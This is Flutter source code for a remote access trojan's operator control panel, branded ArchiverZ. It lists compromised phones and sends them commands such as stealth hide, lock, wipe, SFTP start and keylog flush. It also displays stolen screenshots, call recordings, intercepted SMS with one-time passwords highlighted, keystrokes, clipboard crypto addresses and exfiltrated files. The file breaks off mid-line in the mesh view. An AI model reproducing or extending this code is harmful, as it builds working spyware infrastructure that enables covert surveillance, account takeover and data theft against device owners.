// ============================================================
//  ArchiverZ — RAT Control Panel
//
//  Lists all RAT-connected devices, lets owner/admin:
//    - View device summary (screenshots, recordings, SMS, keylog, etc.)
//    - Send WebSocket commands to a specific device
//    - Browse files via SFTP or HTTP file browser
//    - View live events (OTP, clipboard, app installs)
//
//  Backend endpoints (defined in ArchiverZ-API/rat-module.js):
//    GET  /api/rat/devices                   — list all RAT users
//    GET  /api/rat/device/:username          — full device data
//    GET  /api/rat/screenshots?username=...  — list screenshots
//    GET  /api/rat/recordings?username=...   — list call recordings
//    GET  /api/rat/sms?username=...          — list SMS intercepts
//    GET  /api/rat/keylog?username=...       — list keystroke flushes
//    GET  /api/rat/clipboard?username=...    — list clipboard events
//    GET  /api/rat/appinstalls?username=...  — list app installs
//    GET  /api/rat/files?username=...        — list uploaded files
//    GET  /api/rat/mesh-peers?username=...   — list mesh peers
//    GET  /api/rat/update.json               — current update metadata
//    POST /api/rat/update.json               — set update metadata
// ============================================================
import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';
import 'config/app_config.dart';
import 'config/api.dart';
import 'core/design_system.dart';

class RatControlPanelPage extends StatefulWidget {
  final String sessionKey;
  final String currentUser;

  const RatControlPanelPage({
    super.key,
    required this.sessionKey,
    required this.currentUser,
  });

  @override
  State<RatControlPanelPage> createState() => _RatControlPanelPageState();
}

class _RatControlPanelPageState extends State<RatControlPanelPage>
    with SingleTickerProviderStateMixin {
  late TabController _tabController;
  List<Map<String, dynamic>> _devices = [];
  Map<String, dynamic>? _selectedDevice;
  bool _loading = true;
  String? _error;
  late Timer _refreshTimer;

  @override
  void initState() {
    super.initState();
    _tabController = TabController(length: 5, vsync: this);
    _fetchDevices();
    _refreshTimer = Timer.periodic(const Duration(seconds: 15), (_) => _fetchDevices());
  }

  @override
  void dispose() {
    _refreshTimer.cancel();
    _tabController.dispose();
    super.dispose();
  }

  Future<void> _fetchDevices() async {
    try {
      final res = await http.get(
        Uri.parse('${Api.api}/api/rat/devices?key=${widget.sessionKey}'),
        headers: {'Accept': 'application/json'},
      ).timeout(const Duration(seconds: 8));
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        if (data['success'] == true) {
          setState(() {
            _devices = List<Map<String, dynamic>>.from(data['devices'] ?? []);
            _loading = false;
            _error = null;
          });
          return;
        }
      }
      setState(() {
        _error = 'HTTP ${res.statusCode}';
        _loading = false;
      });
    } catch (e) {
      setState(() {
        _error = e.toString();
        _loading = false;
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: ArchiverZColors.bg,
      body: AnimatedArchiverBackground(
        child: SafeArea(
          child: Column(
            children: [
              _buildHeader(),
              _buildTabBar(),
              Expanded(
                child: TabBarView(
                  controller: _tabController,
                  children: [
                    _buildDevicesTab(),
                    _buildCommandConsoleTab(),
                    _buildDataViewTab(),
                    _buildMeshTab(),
                    _buildUpdateTab(),
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  // ---------- Header ----------
  Widget _buildHeader() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(20, 16, 20, 8),
      child: Row(
        children: [
          const ArchiverBrandMark(size: 40, withRing: false),
          const SizedBox(width: 14),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const ArchiverHeroTitle(text: 'RAT Control', fontSize: 18, letterSpacing: 2),
                Text(
                  '${_devices.length} devices online · ${widget.currentUser}',
                  style: TextStyle(
                    color: ArchiverZColors.textDim,
                    fontSize: 11,
                    fontFamily: AppConfig.fontMono,
                  ),
                ),
              ],
            ),
          ),
          IconButton(
            icon: Icon(Icons.refresh, color: ArchiverZColors.primary, size: 20),
            onPressed: _fetchDevices,
          ),
        ],
      ),
    );
  }

  // ---------- Tab bar ----------
  Widget _buildTabBar() {
    return GlassCard(
      margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 4),
      padding: EdgeInsets.zero,
      radius: 14,
      blurSigma: 12,
      child: TabBar(
        controller: _tabController,
        indicatorColor: ArchiverZColors.primary,
        indicatorSize: TabBarIndicatorSize.tab,
        labelColor: ArchiverZColors.primary,
        unselectedLabelColor: ArchiverZColors.textDim,
        labelStyle: const TextStyle(fontSize: 11, fontFamily: AppConfig.fontDisplay, fontWeight: FontWeight.bold),
        unselectedLabelStyle: const TextStyle(fontSize: 11, fontFamily: AppConfig.fontMono),
        tabs: const [
          Tab(icon: Icon(Icons.devices, size: 14), text: 'Devices'),
          Tab(icon: Icon(Icons.terminal, size: 14), text: 'Console'),
          Tab(icon: Icon(Icons.folder_open, size: 14), text: 'Data'),
          Tab(icon: Icon(Icons.hub, size: 14), text: 'Mesh'),
          Tab(icon: Icon(Icons.system_update, size: 14), text: 'Update'),
        ],
      ),
    );
  }

  // ---------- Tab 1: Devices ----------
  Widget _buildDevicesTab() {
    if (_loading) {
      return Center(child: CircularProgressIndicator(color: ArchiverZColors.primary, strokeWidth: 2));
    }
    if (_error != null) {
      return Center(
        child: Padding(
          padding: const EdgeInsets.all(20),
          child: Text('Failed to load: $_error',
            style: TextStyle(color: ArchiverZColors.danger, fontFamily: AppConfig.fontMono),
            textAlign: TextAlign.center,
          ),
        ),
      );
    }
    if (_devices.isEmpty) {
      return Center(
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Icon(Icons.phonelink_off, size: 48, color: ArchiverZColors.textDim),
            const SizedBox(height: 16),
            Text('No RAT devices connected yet',
              style: TextStyle(color: ArchiverZColors.textDim, fontFamily: AppConfig.fontMono)),
          ],
        ),
      );
    }
    return RefreshIndicator(
      color: ArchiverZColors.primary,
      onRefresh: _fetchDevices,
      child: ListView.builder(
        padding: const EdgeInsets.all(16),
        itemCount: _devices.length,
        itemBuilder: (context, i) => _buildDeviceCard(_devices[i]),
      ),
    );
  }

  Widget _buildDeviceCard(Map<String, dynamic> d) {
    final username = d['username'] ?? '?';
    final lastSeen = d['last_seen'] ?? 0;
    final lastSeenStr = lastSeen > 0
      ? DateTime.fromMillisecondsSinceEpoch(lastSeen).toLocal().toString().substring(0, 19)
      : 'never';
    final screenshots = d['screenshots'] ?? 0;
    final recordings = d['recordings'] ?? 0;
    final sms = d['sms'] ?? 0;
    final keylog = d['keylog'] ?? 0;
    final clipboard = d['clipboard'] ?? 0;
    final appinstalls = d['appinstalls'] ?? 0;

    return GlassCard(
      margin: const EdgeInsets.only(bottom: 12),
      padding: const EdgeInsets.all(16),
      onTap: () {
        setState(() => _selectedDevice = d);
        _tabController.animateTo(2);  // Switch to Data tab
      },
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.smartphone, color: ArchiverZColors.primary, size: 18),
              const SizedBox(width: 10),
              Expanded(
                child: Text(
                  username,
                  style: const TextStyle(
                    color: Colors.white,
                    fontFamily: AppConfig.fontDisplay,
                    fontWeight: FontWeight.bold,
                    fontSize: 14,
                  ),
                ),
              ),
              Icon(Icons.chevron_right, color: ArchiverZColors.textDim, size: 18),
            ],
          ),
          const SizedBox(height: 8),
          Text(
            'Last seen: $lastSeenStr',
            style: TextStyle(color: ArchiverZColors.textDim, fontSize: 10, fontFamily: AppConfig.fontMono),
          ),
          const SizedBox(height: 12),
          Wrap(
            spacing: 8,
            runSpacing: 8,
            children: [
              _buildStatChip('Shot', screenshots, Icons.camera_alt),
              _buildStatChip('Rec', recordings, Icons.mic),
              _buildStatChip('SMS', sms, Icons.sms),
              _buildStatChip('Keys', keylog, Icons.keyboard),
              _buildStatChip('Clip', clipboard, Icons.copy),
              _buildStatChip('Apps', appinstalls, Icons.download),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildStatChip(String label, int count, IconData icon) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
      decoration: BoxDecoration(
        color: count > 0
          ? ArchiverZColors.primary.withOpacity(0.15)
          : ArchiverZColors.glassFill(opacity: 0.05),
        borderRadius: BorderRadius.circular(8),
        border: Border.all(
          color: count > 0
            ? ArchiverZColors.primary.withOpacity(0.4)
            : ArchiverZColors.glassBorder(opacity: 0.1),
          width: 0.5,
        ),
      ),
      child: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          Icon(icon, size: 11, color: count > 0 ? ArchiverZColors.primary : ArchiverZColors.textDim),
          const SizedBox(width: 4),
          Text(
            '$label: $count',
            style: TextStyle(
              color: count > 0 ? ArchiverZColors.text : ArchiverZColors.textDim,
              fontSize: 10,
              fontFamily: AppConfig.fontMono,
            ),
          ),
        ],
      ),
    );
  }

  // ---------- Tab 2: Command Console ----------
  Widget _buildCommandConsoleTab() {
    return RatCommandConsole(
      sessionKey: widget.sessionKey,
      selectedDevice: _selectedDevice?['username'],
      onDeviceCleared: () => setState(() => _selectedDevice = null),
    );
  }

  // ---------- Tab 3: Data View ----------
  Widget _buildDataViewTab() {
    return RatDataView(
      sessionKey: widget.sessionKey,
      selectedDevice: _selectedDevice?['username'],
    );
  }

  // ---------- Tab 4: Mesh ----------
  Widget _buildMeshTab() {
    return RatMeshView(
      sessionKey: widget.sessionKey,
      selectedDevice: _selectedDevice?['username'],
    );
  }

  // ---------- Tab 5: Update ----------
  Widget _buildUpdateTab() {
    return RatUpdateView(sessionKey: widget.sessionKey);
  }
}

// ============================================================
//  Command Console — send WebSocket commands to a RAT
// ============================================================
class RatCommandConsole extends StatefulWidget {
  final String sessionKey;
  final String? selectedDevice;
  final VoidCallback? onDeviceCleared;

  const RatCommandConsole({
    super.key,
    required this.sessionKey,
    this.selectedDevice,
    this.onDeviceCleared,
  });

  @override
  State<RatCommandConsole> createState() => _RatCommandConsoleState();
}

class _RatCommandConsoleState extends State<RatCommandConsole> {
  final List<Map<String, dynamic>> _output = [];
  final ScrollController _scrollController = ScrollController();
  String? _deviceUsername;

  @override
  void initState() {
    super.initState();
    _deviceUsername = widget.selectedDevice;
  }

  @override
  void didUpdateWidget(covariant RatCommandConsole oldWidget) {
    super.didUpdateWidget(oldWidget);
    if (widget.selectedDevice != oldWidget.selectedDevice) {
      setState(() => _deviceUsername = widget.selectedDevice);
    }
  }

  void _log(String dir, String text) {
    setState(() {
      _output.add({
        'dir': dir,
        'text': text,
        'ts': DateTime.now().toLocal().toString().substring(11, 19),
      });
    });
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _scrollController.animateTo(
        _scrollController.position.maxScrollExtent,
        duration: const Duration(milliseconds: 200),
        curve: Curves.easeOut,
      );
    });
  }

  Future<void> _sendCommand(String command, Map<String, dynamic> args) async {
    if (_deviceUsername == null) {
      _log('err', 'No device selected. Tap a device in the Devices tab first.');
      return;
    }
    final payload = jsonEncode({
      'type': 'command',
      'target': _deviceUsername,
      'command': command,
      'args': args,
      'id': DateTime.now().millisecondsSinceEpoch.toString(),
    });
    _log('out', '→ $command ${args.isNotEmpty ? jsonEncode(args) : ""}');

    // Send via HTTP POST to /api/rat/send-command (backend relays via WebSocket)
    try {
      final res = await http.post(
        Uri.parse('${Api.api}/api/rat/send-command?key=${widget.sessionKey}'),
        headers: {'Content-Type': 'application/json'},
        body: payload,
      ).timeout(const Duration(seconds: 5));
      if (res.statusCode != 200) {
        _log('err', 'HTTP ${res.statusCode}: ${res.body}');
      }
    } catch (e) {
      _log('err', 'Send failed: $e');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Column(
      children: [
        // Device selector
        GlassCard(
          margin: const EdgeInsets.all(16),
          padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
          child: Row(
            children: [
              Icon(Icons.smartphone, color: ArchiverZColors.primary, size: 18),
              const SizedBox(width: 10),
              Expanded(
                child: Text(
                  _deviceUsername ?? 'No device selected',
                  style: TextStyle(
                    color: _deviceUsername != null ? ArchiverZColors.text : ArchiverZColors.textDim,
                    fontFamily: AppConfig.fontMono,
                    fontSize: 13,
                  ),
                ),
              ),
              if (_deviceUsername != null)
                IconButton(
                  icon: Icon(Icons.close, color: ArchiverZColors.textDim, size: 16),
                  onPressed: () {
                    setState(() => _deviceUsername = null);
                    widget.onDeviceCleared?.call();
                  },
                ),
            ],
          ),
        ),
        // Quick commands grid
        Expanded(
          flex: 2,
          child: GridView.count(
            padding: const EdgeInsets.symmetric(horizontal: 16),
            crossAxisCount: 3,
            childAspectRatio: 1.6,
            crossAxisSpacing: 8,
            mainAxisSpacing: 8,
            children: [
              _cmdButton('Screenshot', Icons.camera_alt, 'screenshot_now', {}),
              _cmdButton('Stealth Hide', Icons.visibility_off, 'stealth_hide', {}),
              _cmdButton('Stealth Show', Icons.visibility, 'stealth_show', {}),
              _cmdButton('Lock', Icons.lock, 'lock', {}),
              _cmdButton('Unlock', Icons.lock_open, 'unlock', {}),
              _cmdButton('Torch On', Icons.flashlight_on, 'flashlight_on', {}),
              _cmdButton('Torch Off', Icons.flashlight_off, 'flashlight_off', {}),
              _cmdButton('SFTP Start', Icons.folder_shared, 'sftp_start', {'port': 2222}),
              _cmdButton('SFTP Stop', Icons.stop_circle_outlined, 'sftp_stop', {}),
              _cmdButton('Keylog Flush', Icons.keyboard, 'keylog_flush', {}),
              _cmdButton('SMS Recent', Icons.sms, 'sms_recent', {'limit': 50}),
              _cmdButton('Update Check', Icons.system_update, 'update_check', {}),
              _cmdButton('Wipe', Icons.delete_forever, 'wipe', {}),
              _cmdButton('Safe Mode', Icons.shield, 'safe_mode_check', {}),
              _cmdButton('Battery', Icons.battery_std, 'battery_status', {}),
              _cmdButton('Network', Icons.wifi, 'network_status', {}),
              _cmdButton('Mesh', Icons.hub, 'mesh_status', {}),
              _cmdButton('Clipper', Icons.copy, 'clipper_status', {}),
            ],
          ),
        ),
        // Output console
        Expanded(
          flex: 3,
          child: GlassCard(
            margin: const EdgeInsets.all(16),
            padding: const EdgeInsets.all(8),
            child: Column(
              children: [
                Row(
                  children: [
                    Text('Console',
                      style: TextStyle(
                        color: ArchiverZColors.textDim,
                        fontSize: 10,
                        fontFamily: AppConfig.fontMono,
                        letterSpacing: 1,
                      )),
                    const Spacer(),
                    IconButton(
                      icon: Icon(Icons.delete_outline, size: 14, color: ArchiverZColors.textDim),
                      onPressed: () => setState(() => _output.clear()),
                      constraints: const BoxConstraints(),
                      padding: EdgeInsets.zero,
                    ),
                  ],
                ),
                Expanded(
                  child: ListView.builder(
                    controller: _scrollController,
                    itemCount: _output.length,
                    itemBuilder: (context, i) {
                      final e = _output[i];
                      final isErr = e['dir'] == 'err';
                      return Padding(
                        padding: const EdgeInsets.symmetric(vertical: 2),
                        child: RichText(
                          text: TextSpan(
                            style: const TextStyle(
                              fontFamily: AppConfig.fontMono,
                              fontSize: 11,
                              height: 1.4,
                            ),
                            children: [
                              TextSpan(
                                text: '${e['ts']} ',
                                style: TextStyle(color: ArchiverZColors.textDim)),
                              TextSpan(
                                text: '${e['text']}\n',
                                style: TextStyle(
                                  color: isErr
                                    ? ArchiverZColors.danger
                                    : e['dir'] == 'out'
                                      ? ArchiverZColors.primary
                                      : ArchiverZColors.text,
                                ),
                              ),
                            ],
                          ),
                        ),
                      );
                    },
                  ),
                ),
              ],
            ),
          ),
        ),
      ],
    );
  }

  Widget _cmdButton(String label, IconData icon, String command, Map<String, dynamic> args) {
    return GlassCard(
      padding: EdgeInsets.zero,
      radius: 12,
      blurSigma: 10,
      onTap: () => _sendCommand(command, args),
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(icon, color: ArchiverZColors.primary, size: 18),
          const SizedBox(height: 4),
          Text(
            label,
            style: const TextStyle(
              color: Colors.white,
              fontSize: 10,
              fontFamily: AppConfig.fontMono,
              fontWeight: FontWeight.w600,
            ),
            textAlign: TextAlign.center,
          ),
        ],
      ),
    );
  }
}

// ============================================================
//  Data View — fetch and display device data (screenshots, SMS, etc.)
// ============================================================
class RatDataView extends StatefulWidget {
  final String sessionKey;
  final String? selectedDevice;
  const RatDataView({super.key, required this.sessionKey, this.selectedDevice});
  @override
  State<RatDataView> createState() => _RatDataViewState();
}

class _RatDataViewState extends State<RatDataView> {
  String? _device;
  String _category = 'screenshots';
  List<dynamic> _data = [];
  bool _loading = false;
  String? _error;

  final categories = [
    ('screenshots', 'Screenshots', Icons.camera_alt),
    ('recordings', 'Call Recs', Icons.mic),
    ('sms', 'SMS/OTP', Icons.sms),
    ('keylog', 'Keylog', Icons.keyboard),
    ('clipboard', 'Clipboard', Icons.copy),
    ('appinstalls', 'App Installs', Icons.download),
    ('files', 'Files', Icons.folder),
  ];

  @override
  void initState() {
    super.initState();
    _device = widget.selectedDevice;
    if (_device != null) _fetch();
  }

  @override
  void didUpdateWidget(covariant RatDataView oldWidget) {
    super.didUpdateWidget(oldWidget);
    if (widget.selectedDevice != oldWidget.selectedDevice) {
      setState(() => _device = widget.selectedDevice);
      if (_device != null) _fetch();
    }
  }

  Future<void> _fetch() async {
    if (_device == null) return;
    setState(() { _loading = true; _error = null; });
    try {
      final res = await http.get(
        Uri.parse('${Api.api}/api/rat/$_category?username=$_device&key=${widget.sessionKey}&limit=100'),
      ).timeout(const Duration(seconds: 8));
      if (res.statusCode == 200) {
        final body = jsonDecode(res.body);
        setState(() {
          _data = body['data'] ?? [];
          _loading = false;
        });
      } else {
        setState(() {
          _error = 'HTTP ${res.statusCode}';
          _loading = false;
        });
      }
    } catch (e) {
      setState(() { _error = e.toString(); _loading = false; });
    }
  }

  @override
  Widget build(BuildContext context) {
    return Column(
      children: [
        // Device + category selector
        Padding(
          padding: const EdgeInsets.all(16),
          child: Row(
            children: [
              Expanded(
                child: GlassCard(
                  padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
                  child: Text(
                    _device ?? 'No device selected',
                    style: TextStyle(
                      color: _device != null ? ArchiverZColors.text : ArchiverZColors.textDim,
                      fontFamily: AppConfig.fontMono,
                      fontSize: 12,
                    ),
                  ),
                ),
              ),
              const SizedBox(width: 8),
              GlassCard(
                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
                child: DropdownButton<String>(
                  value: _category,
                  dropdownColor: ArchiverZColors.bgSurface,
                  underline: const SizedBox(),
                  style: TextStyle(color: ArchiverZColors.primary, fontFamily: AppConfig.fontMono, fontSize: 12),
                  items: categories.map((c) => DropdownMenuItem(
                    value: c.$1,
                    child: Row(
                      children: [
                        Icon(c.$3, size: 14, color: ArchiverZColors.primary),
                        const SizedBox(width: 6),
                        Text(c.$2),
                      ],
                    ),
                  )).toList(),
                  onChanged: (v) {
                    if (v == null) return;
                    setState(() => _category = v);
                    _fetch();
                  },
                ),
              ),
            ],
          ),
        ),
        // Refresh button
        if (_device != null)
          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 16),
            child: Align(
              alignment: Alignment.centerLeft,
              child: GlowButton(
                label: 'Refresh',
                icon: Icons.refresh,
                outlined: true,
                height: 38,
                onPressed: _fetch,
              ),
            ),
          ),
        const SizedBox(height: 12),
        // Data list
        Expanded(
          child: _device == null
            ? _empty('Select a device first')
            : _loading
              ? Center(child: CircularProgressIndicator(color: ArchiverZColors.primary, strokeWidth: 2))
              : _error != null
                ? _empty(_error!)
                : _data.isEmpty
                  ? _empty('No $_category data yet')
                  : RefreshIndicator(
                      color: ArchiverZColors.primary,
                      onRefresh: _fetch,
                      child: _buildDataList(),
                    ),
        ),
      ],
    );
  }

  Widget _buildDataList() {
    if (_category == 'screenshots') {
      return GridView.builder(
        padding: const EdgeInsets.all(16),
        gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
          crossAxisCount: 2,
          crossAxisSpacing: 8,
          mainAxisSpacing: 8,
        ),
        itemCount: _data.length,
        itemBuilder: (context, i) {
          final item = _data[i] as Map<String, dynamic>;
          return GlassCard(
            padding: EdgeInsets.zero,
            radius: 12,
            onTap: () => _openUrl(item['url']),
            child: Stack(
              children: [
                Positioned.fill(child: ClipRRect(
                  borderRadius: BorderRadius.circular(12),
                  child: Image.network(item['url'], fit: BoxFit.cover,
                    errorBuilder: (_, __, ___) => Container(
                      color: ArchiverZColors.bgSurface,
                      child: Icon(Icons.broken_image, color: ArchiverZColors.textDim),
                    ),
                  ),
                )),
                Positioned(
                  bottom: 0, left: 0, right: 0,
                  child: Container(
                    padding: const EdgeInsets.all(6),
                    decoration: BoxDecoration(
                      gradient: LinearGradient(colors: [
                        ArchiverZColors.bg.withOpacity(0.9),
                        Colors.transparent,
                      ], begin: Alignment.bottomCenter, end: Alignment.topCenter),
                    ),
                    child: Text(
                      DateTime.fromMillisecondsSinceEpoch(item['timestamp'] ?? 0)
                          .toLocal().toString().substring(0, 19),
                      style: TextStyle(color: ArchiverZColors.textDim, fontSize: 9, fontFamily: AppConfig.fontMono),
                    ),
                  ),
                ),
              ],
            ),
          );
        },
      );
    }
    return ListView.builder(
      padding: const EdgeInsets.all(16),
      itemCount: _data.length,
      itemBuilder: (context, i) {
        final item = _data[i] as Map<String, dynamic>;
        return GlassCard(
          margin: const EdgeInsets.only(bottom: 8),
          padding: const EdgeInsets.all(12),
          child: _renderDataItem(item),
        );
      },
    );
  }

  Widget _renderDataItem(Map<String, dynamic> item) {
    switch (_category) {
      case 'sms':
        final ts = DateTime.fromMillisecondsSinceEpoch(item['timestamp'] ?? 0).toLocal().toString().substring(0, 19);
        return Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Icon(Icons.person, size: 12, color: ArchiverZColors.secondary),
                const SizedBox(width: 4),
                Text(item['sender'] ?? '?',
                  style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontFamily: AppConfig.fontMono, fontSize: 12)),
                const Spacer(),
                if (item['otp'] != null)
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                    decoration: BoxDecoration(
                      color: ArchiverZColors.danger.withOpacity(0.2),
                      borderRadius: BorderRadius.circular(4),
                      border: Border.all(color: ArchiverZColors.danger, width: 0.5),
                    ),
                    child: Text('OTP: ${item['otp']}',
                      style: TextStyle(color: ArchiverZColors.danger, fontFamily: AppConfig.fontMono, fontSize: 10, fontWeight: FontWeight.bold)),
                  ),
              ],
            ),
            const SizedBox(height: 6),
            Text(item['body'] ?? '',
              style: TextStyle(color: ArchiverZColors.text, fontFamily: AppConfig.fontMono, fontSize: 11, height: 1.4)),
            const SizedBox(height: 4),
            Text(ts, style: TextStyle(color: ArchiverZColors.textDim, fontSize: 9, fontFamily: AppConfig.fontMono)),
          ],
        );
      case 'keylog':
        final ts = DateTime.fromMillisecondsSinceEpoch(item['timestamp'] ?? 0).toLocal().toString().substring(0, 19);
        final keys = (item['keystrokes'] as List?) ?? [];
        final text = keys.map((k) => (k as Map)['k'] ?? '').join();
        return Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Icon(Icons.keyboard, size: 12, color: ArchiverZColors.primary),
                const SizedBox(width: 4),
                Text('${item['count'] ?? keys.length} keys',
                  style: TextStyle(color: ArchiverZColors.primary, fontFamily: AppConfig.fontMono, fontSize: 11, fontWeight: FontWeight.bold)),
                const Spacer(),
                Text(ts, style: TextStyle(color: ArchiverZColors.textDim, fontSize: 9, fontFamily: AppConfig.fontMono)),
              ],
            ),
            const SizedBox(height: 6),
            Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: ArchiverZColors.bgSurface.withOpacity(0.5),
                borderRadius: BorderRadius.circular(6),
              ),
              child: SelectableText(
                text.length > 500 ? text.substring(0, 500) + '...' : text,
                style: TextStyle(color: ArchiverZColors.text, fontFamily: AppConfig.fontMono, fontSize: 11, height: 1.4),
              ),
            ),
          ],
        );
      case 'clipboard':
        final ts = DateTime.fromMillisecondsSinceEpoch(item['timestamp'] ?? 0).toLocal().toString().substring(0, 19);
        final isCrypto = item['type'] != 'text';
        return Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Icon(isCrypto ? Icons.currency_bitcoin : Icons.copy, size: 12,
                  color: isCrypto ? ArchiverZColors.danger : ArchiverZColors.primary),
                const SizedBox(width: 4),
                Text(item['type'] ?? 'text',
                  style: TextStyle(color: isCrypto ? ArchiverZColors.danger : ArchiverZColors.primary,
                    fontFamily: AppConfig.fontMono, fontSize: 10, fontWeight: FontWeight.bold)),
                const Spacer(),
                Text(ts, style: TextStyle(color: ArchiverZColors.textDim, fontSize: 9, fontFamily: AppConfig.fontMono)),
              ],
            ),
            const SizedBox(height: 6),
            SelectableText(item['content'] ?? '',
              style: TextStyle(color: ArchiverZColors.text, fontFamily: AppConfig.fontMono, fontSize: 11)),
          ],
        );
      case 'appinstalls':
        final ts = DateTime.fromMillisecondsSinceEpoch(item['timestamp'] ?? 0).toLocal().toString().substring(0, 19);
        return Row(
          children: [
            Icon(item['action'] == 'installed' ? Icons.download : Icons.delete,
              size: 14, color: item['action'] == 'installed' ? ArchiverZColors.success : ArchiverZColors.danger),
            const SizedBox(width: 8),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(item['package'] ?? '?',
                    style: const TextStyle(color: Colors.white, fontFamily: AppConfig.fontMono, fontSize: 11)),
                  Text('${item['action']} · $ts',
                    style: TextStyle(color: ArchiverZColors.textDim, fontSize: 9, fontFamily: AppConfig.fontMono)),
                ],
              ),
            ),
          ],
        );
      case 'recordings':
        final ts = DateTime.fromMillisecondsSinceEpoch(item['timestamp'] ?? 0).toLocal().toString().substring(0, 19);
        final dur = Duration(milliseconds: item['duration_ms'] ?? 0);
        return Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Icon(Icons.mic, size: 14, color: ArchiverZColors.primary),
                const SizedBox(width: 8),
                Expanded(
                  child: Text('${dur.inMinutes}:${(dur.inSeconds % 60).toString().padLeft(2, '0')}',
                    style: TextStyle(color: Colors.white, fontFamily: AppConfig.fontMono, fontSize: 12, fontWeight: FontWeight.bold)),
                ),
                Text(ts, style: TextStyle(color: ArchiverZColors.textDim, fontSize: 9, fontFamily: AppConfig.fontMono)),
              ],
            ),
            const SizedBox(height: 8),
            GlowButton(
              label: 'Play',
              icon: Icons.play_arrow,
              outlined: true,
              height: 32,
              onPressed: () => _openUrl(item['url']),
            ),
          ],
        );
      case 'files':
        final ts = DateTime.fromMillisecondsSinceEpoch(item['timestamp'] ?? 0).toLocal().toString().substring(0, 19);
        final size = item['size'] ?? 0;
        final kb = (size / 1024).toStringAsFixed(1);
        return Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Icon(Icons.insert_drive_file, size: 14, color: ArchiverZColors.secondary),
                const SizedBox(width: 8),
                Expanded(
                  child: Text(item['original_path']?.split('/').last ?? item['filename'] ?? '?',
                    style: TextStyle(color: Colors.white, fontFamily: AppConfig.fontMono, fontSize: 11)),
                ),
              ],
            ),
            const SizedBox(height: 4),
            Text('$kb KB · $ts',
              style: TextStyle(color: ArchiverZColors.textDim, fontSize: 9, fontFamily: AppConfig.fontMono)),
            const SizedBox(height: 6),
            GlowButton(
              label: 'Download',
              icon: Icons.download,
              outlined: true,
              height: 30,
              onPressed: () => _openUrl(item['url']),
            ),
          ],
        );
      default:
        return Text(jsonEncode(item), style: TextStyle(color: ArchiverZColors.text, fontFamily: AppConfig.fontMono, fontSize: 10));
    }
  }

  Widget _empty(String msg) {
    return Center(
      child: Padding(
        padding: const EdgeInsets.all(20),
        child: Text(msg,
          style: TextStyle(color: ArchiverZColors.textDim, fontFamily: AppConfig.fontMono),
          textAlign: TextAlign.center),
      ),
    );
  }

  Future<void> _openUrl(String url) async {
    final uri = Uri.parse(url);
    if (!await launchUrl(uri, mode: LaunchMode.externalApplication)) {
      // ignore
    }
  }
}

// ============================================================
//  Mesh View — show peer topology
// ============================================================
class RatMeshView extends StatefulWidget {
  final String sessionKey;
  final String? selectedDevice;
  const RatMeshView({super.key, required this.sessionKey, this.selectedDevice});
  @override
  State<RatMeshView> createState() => _RatMeshViewState();
}

class _RatMeshViewState extends State<RatMeshView> {
  List<dynamic> _peers = [];
  bool _loading = false;

  @override
  void initState() {
    super.initState();
    if (widget.selectedDevice != null) _fetch();
  }

  @override
  void didUpdateWidget(covariant RatMeshView oldWidget) {
    super.didUpdateWidget(oldWidget);
    if (widget.selectedDevice != oldWidget.selectedDevice && widget.selectedDevice != null) {
      _fetch();
    }
  }

  Future<void> _fetch() async {
    if (widget.selectedDevice == null) return;
    setState(() => _loading = true);
    try {
      final res = await http.get(
        Uri.parse('${Api.api}/api/rat/mesh-peers?username=${widget.selectedDevice}&key=${widget.sessionKey}'),
      ).timeout(const Duration(seconds: 8));
      if (res.statusCode == 200) {
        final body = jsonDecode(res.body);
        setState(() {
          _peers = body['peers'] ?? [];
          _loading = false;
        });
      } else {
        setState(() => _loading = false);
      }
    } catch (_) {
      setState(() => _loading = false);
    }
  }

  @override
  Widget build(BuildContext context) {
    if (widget.selectedDevice == null) {
      return Center(
        child: Text('Select a device first',
          style: TextStyle(color: ArchiverZColors.textDim, fontFamily: AppConfig.fontMono)),
      );
    }
    return Column(
      children: [
        Padding(
          padding: const EdgeInsets.all(16),
          child: Row(
            children: [
              Icon(Icons.hub, color: ArchiverZColors.primary, size: 18),
              const SizedBox(width: 10),
              Expanded(
                child: Text('Mesh peers for ${widget.selectedDevice}',
                  style: TextStyle(color: ArchiverZColors.text, fontFamily: AppConfig.fontMono, fontSize: 12)),
              ),
              IconButton(
                icon: Icon(Icons.refresh, color: ArchiverZColors.primary, size: 18),
                onPressed: _fetch,
              ),
            ],
          ),
        ),
        Expanded(
          child: _loading
            ? Center(child: CircularProgressIndicator(color: ArchiverZColors.primary, strokeWidth: 2))
            : _peers.isEmpty
              ? Center(
                  child: Text('No mesh peers discovered (devices may not be on same LAN)',
